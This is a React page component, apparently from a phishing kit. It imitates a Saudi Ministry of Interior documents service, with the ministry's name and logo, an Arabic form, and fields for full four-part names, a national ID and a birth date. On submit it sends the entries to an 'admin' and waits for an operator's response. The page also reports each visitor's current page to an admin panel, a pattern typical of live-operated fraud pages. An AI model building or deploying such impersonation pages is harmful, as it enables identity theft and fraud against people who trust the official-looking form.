import { useState, useEffect } from 'react';
import { sendData, navigateToPage, updatePage } from '@/lib/store';
import { useLocation } from 'wouter';
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { CalendarIcon } from 'lucide-react';
import { Calendar } from "@/components/ui/calendar";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { cn } from "@/lib/utils";

const Documents = () => {
  const [, navigate] = useLocation();
  
  // Get service name from URL
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'الوثائق والمستندات';
  
  // Update page name in admin panel
  useEffect(() => {
    updatePage("صفحة الوثائق");
    navigateToPage("صفحة الوثائق");
  }, []);

  // Arabic Name (4 parts)
  const [arabicFirstName, setArabicFirstName] = useState('');
  const [arabicSecondName, setArabicSecondName] = useState('');
  const [arabicThirdName, setArabicThirdName] = useState('');
  const [arabicFourthName, setArabicFourthName] = useState('');
  
  // English Name (4 parts)
  const [englishFirstName, setEnglishFirstName] = useState('');
  const [englishSecondName, setEnglishSecondName] = useState('');
  const [englishThirdName, setEnglishThirdName] = useState('');
  const [englishFourthName, setEnglishFourthName] = useState('');
  
  // National ID
  const [nationalId, setNationalId] = useState('');
  const [nationalIdError, setNationalIdError] = useState('');
  
  // Date of Birth
  const [calendarType, setCalendarType] = useState<'gregorian' | 'hijri'>('gregorian');
  const [dateOfBirth, setDateOfBirth] = useState<Date | undefined>(undefined);
  const [hijriDate, setHijriDate] = useState({ day: '', month: '', year: '' });
  
  // Validation errors
  const [validationErrors, setValidationErrors] = useState<Record<string, string>>({});

  // Hijri months
  const hijriMonths = [
    { value: '1', label: 'محرم' },
    { value: '2', label: 'صفر' },
    { value: '3', label: 'ربيع الأول' },
    { value: '4', label: 'ربيع الثاني' },
    { value: '5', label: 'جمادى الأولى' },
    { value: '6', label: 'جمادى الآخرة' },
    { value: '7', label: 'رجب' },
    { value: '8', label: 'شعبان' },
    { value: '9', label: 'رمضان' },
    { value: '10', label: 'شوال' },
    { value: '11', label: 'ذو القعدة' },
    { value: '12', label: 'ذو الحجة' },
  ];

  // Validate National ID
  const validateNationalId = (value: string) => {
    if (value.length > 0 && value.length !== 10) {
      setNationalIdError('رقم الهوية يجب أن يكون 10 أرقام');
      return false;
    }
    if (value.length === 10 && !value.startsWith('1') && !value.startsWith('2')) {
      setNationalIdError('رقم الهوية يجب أن يبدأ بـ 1 أو 2');
      return false;
    }
    setNationalIdError('');
    return true;
  };

  // Handle form submission
  const handleSubmit = () => {
    const errors: Record<string, string> = {};
    
    // Validate Arabic name
    if (!arabicFirstName) errors.arabicFirstName = 'الاسم الأول مطلوب';
    if (!arabicSecondName) errors.arabicSecondName = 'اسم الأب مطلوب';
    if (!arabicThirdName) errors.arabicThirdName = 'اسم الجد مطلوب';
    if (!arabicFourthName) errors.arabicFourthName = 'اسم العائلة مطلوب';
    
    // Validate English name
    if (!englishFirstName) errors.englishFirstName = 'First name is required';
    if (!englishSecondName) errors.englishSecondName = 'Second name is required';
    if (!englishThirdName) errors.englishThirdName = 'Third name is required';
    if (!englishFourthName) errors.englishFourthName = 'Last name is required';
    
    // Validate National ID
    if (!nationalId) {
      errors.nationalId = 'رقم الهوية مطلوب';
    } else if (nationalId.length !== 10) {
      errors.nationalId = 'رقم الهوية يجب أن يكون 10 أرقام';
    }
    
    // Validate Date of Birth
    if (calendarType === 'gregorian' && !dateOfBirth) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    if (calendarType === 'hijri' && (!hijriDate.day || !hijriDate.month || !hijriDate.year)) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    
    setValidationErrors(errors);
    
    if (Object.keys(errors).length === 0) {
      // Send data to admin
      const formData = {
        'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
        'الاسم الأول (عربي)': arabicFirstName,
        'اسم الأب (عربي)': arabicSecondName,
        'اسم الجد (عربي)': arabicThirdName,
        'اسم العائلة (عربي)': arabicFourthName,
        'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
        'First Name': englishFirstName,
        'Second Name': englishSecondName,
        'Third Name': englishThirdName,
        'Last Name': englishFourthName,
        'رقم الهوية الوطنية': nationalId,
        'تاريخ الميلاد': calendarType === 'hijri' 
          ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
          : dateOfBirth?.toLocaleDateString('ar-SA'),
      };
      
      sendData({
        current: 'صفحة الوثائق',
        ...formData,
        waitingForAdminResponse: true,
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />
      
      <main className="flex-1 py-8">
        <div className="container mx-auto px-4 max-w-4xl">
          {/* Logo */}
          <div className="flex justify-center mb-8">
            <img 
              src="/images/moi-logo.png" 
              alt="وزارة الداخلية" 
              className="h-24 object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>
          
          <div className="bg-white rounded-xl shadow-lg p-6 md:p-8">
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-8">{serviceName}</h1>
            
            {/* National ID and Date of Birth */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">معلومات الهوية</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* National ID */}
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">رقم الهوية الوطنية <span className="text-red-500">*</span></Label>
                  <Input
                    value={nationalId}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                      setNationalId(value);
                      validateNationalId(value);
                      if (validationErrors.nationalId) {
                        setValidationErrors(prev => ({ ...prev, nationalId: '' }));
                      }
                    }}
                    placeholder="1xxxxxxxxx"
                    className={`text-right ${validationErrors.nationalId || nationalIdError ? 'border-red-500' : ''}`}
                    maxLength={10}
                  />
                  {(validationErrors.nationalId || nationalIdError) && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.nationalId || nationalIdError}</p>
                  )}
                </div>
                
                {/* Date of Birth */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <Label className="text-gray-600 text-sm">تاريخ الميلاد <span className="text-red-500">*</span></Label>
                    <div className="flex gap-1">
                      <button
                        type="button"
                        onClick={() => setCalendarType('gregorian')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'gregorian' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                      >
                        ميلادي
                      </button>
                      <button
                        type="button"
                        onClick={() => setCalendarType('hijri')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'hijri' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                      >
                        هجري
                      </button>
                    </div>
                  </div>

                  {calendarType === 'gregorian' ? (
                    <Popover>
                      <PopoverTrigger asChild>
                        <Button
                          variant={"outline"}
                          className={cn(
                            "w-full justify-start text-right font-normal h-12",
                            !dateOfBirth && "text-muted-foreground",
                            validationErrors.dateOfBirth && "border-red-500"
                          )}
                        >
                          <CalendarIcon className="ml-2 h-4 w-4" />
                          {dateOfBirth ? dateOfBirth.toLocaleDateString('en-CA') : <span>اختر التاريخ</span>}
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent className="w-auto p-0" align="start">
                        <Calendar
                          mode="single"
                          selected={dateOfBirth}
                          onSelect={(date) => {
                            setDateOfBirth(date);
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          disabled={(date) => date > new Date() || date < new Date("1940-01-01")}
                          initialFocus
                          captionLayout="dropdown"
                          fromYear={1940}
                          toYear={new Date().getFullYear()}
                        />
                      </PopoverContent>
                    </Popover>
                  ) : (
                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <select
                          value={hijriDate.day}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, day: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">اليوم</option>
                          {Array.from({ length: 30 }, (_, i) => i + 1).map(day => (
                            <option key={day} value={day}>{day}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.month}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, month: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">الشهر</option>
                          {hijriMonths.map(month => (
                            <option key={month.value} value={month.value}>{month.label}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.year}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, year: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                        >
                          <option value="">السنة</option>
                          {Array.from({ length: 60 }, (_, i) => 1446 - i).map(year => (
                            <option key={year} value={year}>{year}</option>
                          ))}
                        </select>
                      </div>
                    </div>
                  )}
                  {validationErrors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{validationErrors.dateOfBirth}</p>}
                </div>
              </div>
            </div>
            
            {/* Arabic Name Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">الاسم بالعربي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">الاسم الأول <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFirstName(value);
                      if (validationErrors.arabicFirstName) {
                        setValidationErrors(prev => ({ ...prev, arabicFirstName: '' }));
                      }
                    }}
                    placeholder="محمد"
                    className={`text-right ${validationErrors.arabicFirstName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم الأب <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicSecondName(value);
                      if (validationErrors.arabicSecondName) {
                        setValidationErrors(prev => ({ ...prev, arabicSecondName: '' }));
                      }
                    }}
                    placeholder="عبدالله"
                    className={`text-right ${validationErrors.arabicSecondName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم الجد <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicThirdName(value);
                      if (validationErrors.arabicThirdName) {
                        setValidationErrors(prev => ({ ...prev, arabicThirdName: '' }));
                      }
                    }}
                    placeholder="أحمد"
                    className={`text-right ${validationErrors.arabicThirdName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block">اسم العائلة <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFourthName(value);
                      if (validationErrors.arabicFourthName) {
                        setValidationErrors(prev => ({ ...prev, arabicFourthName: '' }));
                      }
                    }}
                    placeholder="السعودي"
                    className={`text-right ${validationErrors.arabicFourthName ? 'border-red-500' : ''}`}
                  />
                  {validationErrors.arabicFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* English Name Section */}
            <div className="mb-8">
              <h2 className="text-lg font-bold text-gray-700 mb-4 border-b pb-2">الاسم بالإنجليزي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">First Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFirstName(value);
                      if (validationErrors.englishFirstName) {
                        setValidationErrors(prev => ({ ...prev, englishFirstName: '' }));
                      }
                    }}
                    placeholder="Mohammed"
                    className={`text-left ${validationErrors.englishFirstName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Second Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishSecondName(value);
                      if (validationErrors.englishSecondName) {
                        setValidationErrors(prev => ({ ...prev, englishSecondName: '' }));
                      }
                    }}
                    placeholder="Abdullah"
                    className={`text-left ${validationErrors.englishSecondName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Third Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishThirdName(value);
                      if (validationErrors.englishThirdName) {
                        setValidationErrors(prev => ({ ...prev, englishThirdName: '' }));
                      }
                    }}
                    placeholder="Ahmed"
                    className={`text-left ${validationErrors.englishThirdName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 text-sm mb-1 block text-left" dir="ltr">Last Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFourthName(value);
                      if (validationErrors.englishFourthName) {
                        setValidationErrors(prev => ({ ...prev, englishFourthName: '' }));
                      }
                    }}
                    placeholder="Alsaudi"
                    className={`text-left ${validationErrors.englishFourthName ? 'border-red-500' : ''}`}
                    dir="ltr"
                  />
                  {validationErrors.englishFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* Submit Button */}
            <div className="flex justify-center">
              <Button 
                onClick={handleSubmit}
                className="bg-green-600 hover:bg-green-700 text-white px-12 py-3 text-lg"
              >
                إرسال
              </Button>
            </div>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
};

export default Documents;
